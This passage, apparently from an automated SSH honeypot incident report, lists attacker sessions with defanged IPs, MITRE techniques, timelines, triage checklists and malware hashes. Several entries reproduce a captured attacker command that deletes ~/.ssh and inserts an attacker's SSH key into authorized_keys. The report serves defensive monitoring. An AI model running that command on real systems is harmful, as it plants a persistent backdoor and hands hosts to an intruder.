- [ ] Block `37.143.61[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6ffa4e576b8

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]84` |
| **First Seen** | 2026-04-09 21:27 |
| **Last Seen** | 2026-04-09 21:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 21:27:24` | `cowrie.session.connect` |
| `2026-04-09 21:27:24` | `cowrie.client.version` |
| `2026-04-09 21:27:25` | `cowrie.client.kex` |
| `2026-04-09 21:27:26` | `cowrie.login.success` |
| `2026-04-09 21:27:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]84` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-046709d5e5ec

| Field | Detail |
|---|---|
| **Source IP** | `120.48.181[.]192` |
| **First Seen** | 2026-04-09 21:44 |
| **Last Seen** | 2026-04-09 21:44 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 21:44:06` | `cowrie.session.connect` |
| `2026-04-09 21:44:06` | `cowrie.client.version` |
| `2026-04-09 21:44:07` | `cowrie.client.kex` |
| `2026-04-09 21:44:09` | `cowrie.login.success` |
| `2026-04-09 21:44:10` | `cowrie.session.params` |
| `2026-04-09 21:44:10` | `cowrie.command.input` |
| `2026-04-09 21:44:10` | `cowrie.command.failed` |
| `2026-04-09 21:44:14` | `cowrie.log.closed` |
| `2026-04-09 21:44:14` | `cowrie.session.params` |
| `2026-04-09 21:44:14` | `cowrie.command.input` |
| `2026-04-09 21:44:15` | `cowrie.session.file_download` |
| `2026-04-09 21:44:15` | `cowrie.log.closed` |
| `2026-04-09 21:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.181[.]192` to AbuseIPDB if not already reported
- [ ] Block `120.48.181[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90edb70fbb64

| Field | Detail |
|---|---|
| **Source IP** | `120.48.181[.]192` |
| **First Seen** | 2026-04-09 21:44 |
| **Last Seen** | 2026-04-09 21:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 21:44:21` | `cowrie.session.connect` |
| `2026-04-09 21:44:21` | `cowrie.client.version` |
| `2026-04-09 21:44:22` | `cowrie.client.kex` |
| `2026-04-09 21:44:23` | `cowrie.login.success` |
| `2026-04-09 21:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.181[.]192` to AbuseIPDB if not already reported
- [ ] Block `120.48.181[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99d0484fdcdd

| Field | Detail |
|---|---|
| **Source IP** | `120.48.181[.]192` |
| **First Seen** | 2026-04-09 21:52 |
| **Last Seen** | 2026-04-09 21:52 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 21:52:02` | `cowrie.session.connect` |
| `2026-04-09 21:52:02` | `cowrie.client.version` |
| `2026-04-09 21:52:02` | `cowrie.client.kex` |
| `2026-04-09 21:52:07` | `cowrie.login.success` |
| `2026-04-09 21:52:08` | `cowrie.session.params` |
| `2026-04-09 21:52:08` | `cowrie.command.input` |
| `2026-04-09 21:52:08` | `cowrie.command.failed` |
| `2026-04-09 21:52:08` | `cowrie.log.closed` |
| `2026-04-09 21:52:08` | `cowrie.session.params` |
| `2026-04-09 21:52:08` | `cowrie.command.input` |
| `2026-04-09 21:52:11` | `cowrie.session.file_download` |
| `2026-04-09 21:52:11` | `cowrie.log.closed` |
| `2026-04-09 21:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.181[.]192` to AbuseIPDB if not already reported
- [ ] Block `120.48.181[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6f76a16b7a0

| Field | Detail |
|---|---|
| **Source IP** | `187.62.87[.]27` |
| **First Seen** | 2026-04-09 22:20 |
| **Last Seen** | 2026-04-09 22:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 22:20:57` | `cowrie.session.connect` |
| `2026-04-09 22:20:57` | `cowrie.client.version` |
| `2026-04-09 22:20:57` | `cowrie.client.kex` |
| `2026-04-09 22:20:59` | `cowrie.login.success` |
| `2026-04-09 22:20:59` | `cowrie.session.params` |
| `2026-04-09 22:20:59` | `cowrie.command.input` |
| `2026-04-09 22:20:59` | `cowrie.command.failed` |
| `2026-04-09 22:21:00` | `cowrie.log.closed` |
| `2026-04-09 22:21:01` | `cowrie.session.params` |
| `2026-04-09 22:21:01` | `cowrie.command.input` |
| `2026-04-09 22:21:01` | `cowrie.session.file_download` |
| `2026-04-09 22:21:01` | `cowrie.log.closed` |
| `2026-04-09 22:21:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.62.87[.]27` to AbuseIPDB if not already reported
- [ ] Block `187.62.87[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bec5ffec2313

| Field | Detail |
|---|---|
| **Source IP** | `187.62.87[.]27` |
| **First Seen** | 2026-04-09 22:21 |
| **Last Seen** | 2026-04-09 22:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 22:21:05` | `cowrie.session.connect` |
| `2026-04-09 22:21:05` | `cowrie.client.version` |
| `2026-04-09 22:21:05` | `cowrie.client.kex` |
| `2026-04-09 22:21:06` | `cowrie.login.success` |
| `2026-04-09 22:21:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.62.87[.]27` to AbuseIPDB if not already reported
- [ ] Block `187.62.87[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c80c2f47e1b6

| Field | Detail |
|---|---|
| **Source IP** | `119.203.251[.]187` |
| **First Seen** | 2026-04-09 22:22 |
| **Last Seen** | 2026-04-09 22:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 22:22:32` | `cowrie.session.connect` |
| `2026-04-09 22:22:32` | `cowrie.client.version` |
| `2026-04-09 22:22:32` | `cowrie.client.kex` |
| `2026-04-09 22:22:33` | `cowrie.login.success` |
| `2026-04-09 22:22:33` | `cowrie.session.params` |
| `2026-04-09 22:22:33` | `cowrie.command.input` |
| `2026-04-09 22:22:33` | `cowrie.command.failed` |
| `2026-04-09 22:22:33` | `cowrie.log.closed` |
| `2026-04-09 22:22:33` | `cowrie.session.params` |
| `2026-04-09 22:22:33` | `cowrie.command.input` |
| `2026-04-09 22:22:34` | `cowrie.session.file_download` |
| `2026-04-09 22:22:34` | `cowrie.log.closed` |
| `2026-04-09 22:22:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.203.251[.]187` to AbuseIPDB if not already reported
- [ ] Block `119.203.251[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c757fbe03ce

| Field | Detail |
|---|---|
| **Source IP** | `119.203.251[.]187` |
| **First Seen** | 2026-04-09 22:22 |
| **Last Seen** | 2026-04-09 22:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 22:22:36` | `cowrie.session.connect` |
| `2026-04-09 22:22:36` | `cowrie.client.version` |
| `2026-04-09 22:22:36` | `cowrie.client.kex` |
| `2026-04-09 22:22:36` | `cowrie.login.success` |
| `2026-04-09 22:22:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.203.251[.]187` to AbuseIPDB if not already reported
- [ ] Block `119.203.251[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39bb3263d140

| Field | Detail |
|---|---|
| **Source IP** | `123.48.142[.]249` |
| **First Seen** | 2026-04-09 22:27 |
| **Last Seen** | 2026-04-09 22:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 22:27:09` | `cowrie.session.connect` |
| `2026-04-09 22:27:09` | `cowrie.client.version` |
| `2026-04-09 22:27:09` | `cowrie.client.kex` |
| `2026-04-09 22:27:10` | `cowrie.login.success` |
| `2026-04-09 22:27:10` | `cowrie.session.params` |
| `2026-04-09 22:27:10` | `cowrie.command.input` |
| `2026-04-09 22:27:10` | `cowrie.command.failed` |
| `2026-04-09 22:27:10` | `cowrie.log.closed` |
| `2026-04-09 22:27:10` | `cowrie.session.params` |
| `2026-04-09 22:27:10` | `cowrie.command.input` |
| `2026-04-09 22:27:10` | `cowrie.session.file_download` |
| `2026-04-09 22:27:10` | `cowrie.log.closed` |
| `2026-04-09 22:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.48.142[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.48.142[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0320ffed34c7

| Field | Detail |
|---|---|
| **Source IP** | `123.48.142[.]249` |
| **First Seen** | 2026-04-09 22:27 |
| **Last Seen** | 2026-04-09 22:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 22:27:13` | `cowrie.session.connect` |
| `2026-04-09 22:27:13` | `cowrie.client.version` |
| `2026-04-09 22:27:13` | `cowrie.client.kex` |
| `2026-04-09 22:27:13` | `cowrie.login.success` |
| `2026-04-09 22:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.48.142[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.48.142[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efdf4e7506ec

| Field | Detail |
|---|---|
| **Source IP** | `123.48.142[.]249` |
| **First Seen** | 2026-04-09 22:29 |
| **Last Seen** | 2026-04-09 22:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 22:29:02` | `cowrie.session.connect` |
| `2026-04-09 22:29:02` | `cowrie.client.version` |
| `2026-04-09 22:29:02` | `cowrie.client.kex` |
| `2026-04-09 22:29:03` | `cowrie.login.success` |
| `2026-04-09 22:29:03` | `cowrie.session.params` |
| `2026-04-09 22:29:03` | `cowrie.command.input` |
| `2026-04-09 22:29:03` | `cowrie.command.failed` |
| `2026-04-09 22:29:03` | `cowrie.log.closed` |
| `2026-04-09 22:29:04` | `cowrie.session.params` |
| `2026-04-09 22:29:04` | `cowrie.command.input` |
| `2026-04-09 22:29:04` | `cowrie.session.file_download` |
| `2026-04-09 22:29:04` | `cowrie.log.closed` |
| `2026-04-09 22:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.48.142[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.48.142[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3279e889ff21

| Field | Detail |
|---|---|
| **Source IP** | `123.48.142[.]249` |
| **First Seen** | 2026-04-09 22:29 |
| **Last Seen** | 2026-04-09 22:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 22:29:06` | `cowrie.session.connect` |
| `2026-04-09 22:29:06` | `cowrie.client.version` |
| `2026-04-09 22:29:06` | `cowrie.client.kex` |
| `2026-04-09 22:29:06` | `cowrie.login.success` |
| `2026-04-09 22:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.48.142[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.48.142[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b9b63380a14

| Field | Detail |
|---|---|
| **Source IP** | `113.249.104[.]20` |
| **First Seen** | 2026-04-09 22:29 |
| **Last Seen** | 2026-04-09 22:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 22:29:22` | `cowrie.session.connect` |
| `2026-04-09 22:29:22` | `cowrie.client.version` |
| `2026-04-09 22:29:22` | `cowrie.client.kex` |
| `2026-04-09 22:29:22` | `cowrie.login.success` |
| `2026-04-09 22:29:23` | `cowrie.session.params` |
| `2026-04-09 22:29:23` | `cowrie.command.input` |
| `2026-04-09 22:29:23` | `cowrie.command.failed` |
| `2026-04-09 22:29:23` | `cowrie.log.closed` |
| `2026-04-09 22:29:23` | `cowrie.session.params` |
| `2026-04-09 22:29:23` | `cowrie.command.input` |
| `2026-04-09 22:29:24` | `cowrie.session.file_download` |
| `2026-04-09 22:29:24` | `cowrie.log.closed` |
| `2026-04-09 22:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.249.104[.]20` to AbuseIPDB if not already reported
- [ ] Block `113.249.104[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fdd82ae1eee

| Field | Detail |
|---|---|
| **Source IP** | `113.249.104[.]20` |
| **First Seen** | 2026-04-09 22:29 |
| **Last Seen** | 2026-04-09 22:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 22:29:26` | `cowrie.session.connect` |
| `2026-04-09 22:29:26` | `cowrie.client.version` |
| `2026-04-09 22:29:26` | `cowrie.client.kex` |
| `2026-04-09 22:29:26` | `cowrie.login.success` |
| `2026-04-09 22:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.249.104[.]20` to AbuseIPDB if not already reported
- [ ] Block `113.249.104[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `120.48.181[.]192` | **25** | 2026-04-09 21:28 | 2026-04-09 21:58 | 38m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `113.249.104[.]20` | **16** | 2026-04-09 22:24 | 2026-04-09 22:38 | 15m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `36.93.249[.]106` | **11** | 2026-04-09 20:47 | 2026-04-09 21:04 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `123.48.142[.]249` | **4** | 2026-04-09 22:21 | 2026-04-09 22:29 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.91[.]34` | 1 | 2026-04-09 21:26 | 2026-04-09 21:26 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.203.251[.]187` | 1 | 2026-04-09 22:22 | 2026-04-09 22:22 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.22[.]219` | 1 | 2026-04-09 20:49 | 2026-04-09 20:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.80[.]70` | 1 | 2026-04-09 21:26 | 2026-04-09 21:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.224.115[.]232` | 1 | 2026-04-09 22:20 | 2026-04-09 22:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.235[.]114` | 1 | 2026-04-09 21:29 | 2026-04-09 21:30 | 7s | 0 | `T1592` | 🟢 LOW |
| `187.62.87[.]27` | 1 | 2026-04-09 22:21 | 2026-04-09 22:21 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `37.143.61[.]84` | 1 | 2026-04-09 21:27 | 2026-04-09 21:27 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `40.82.214[.]8` | 1 | 2026-04-09 21:24 | 2026-04-09 21:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.236.203[.]81` | 1 | 2026-04-09 22:23 | 2026-04-09 22:24 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 30/100 | 🟢 LOW | Not in VT |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
